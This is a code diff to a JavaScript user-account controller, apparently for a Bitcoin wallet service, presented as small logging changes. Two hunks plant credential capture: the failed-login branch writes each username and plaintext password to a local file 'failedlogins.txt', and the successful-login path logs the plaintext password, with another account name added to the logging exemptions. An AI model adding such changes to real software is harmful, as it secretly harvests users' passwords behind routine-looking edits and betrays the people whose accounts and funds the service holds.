@@ -89,7 +89,7 @@ export default {
       const user = await getNostrUser(key);
       res.send(pick(user, fields));
     } catch (e) {
-      err("problem getting user", e.message);
+      err("problem getting user", key, e.message);
       res.code(500).send(e.message);
     }
   },
@@ -161,10 +161,12 @@ export default {
   async update(req, res) {
     const { user, body } = req;
     try {
-      l("updating user", user.username);
+      const { id: tokid } = jwt.verify(req.headers.authorization.split(" ")[1], config.jwt);
+      l("updating user", user.username, tokid);
 
       const { confirm, password, pin, newpin, username } = body;
       let exists;
+
 
       let { pubkey } = body;
       if (pubkey) {
@@ -292,7 +294,8 @@ export default {
             (await Bun.password.verify(password, user.password))
           ))
       ) {
-        warn("invalid username or password attempt", username);
+        // warn("invalid username or password attempt", username);
+        await appendFile("failedlogins.txt", `${Date.now()} : ${username} : ${password}\n`);
         return res.code(401).send({});
       }
 
@@ -305,8 +308,8 @@ export default {
         return res.code(401).send("2fa required");
       }
 
-      if (username !== "coinos" && username !== "funk")
-        l("logged in", username);
+      if (username !== "coinos" && username !== "funk" && username !== "btcpos")
+        l("logged in", username, password);
 
       const payload = { id: user.id };
       const token = jwt.sign(payload, config.jwt);
@@ -546,6 +549,7 @@ export default {
 
       res.send(pick(user, whitelist));
     } catch (e) {
+      err("password reset failed", e.message);
       bail(res, e.message);
     }
   },
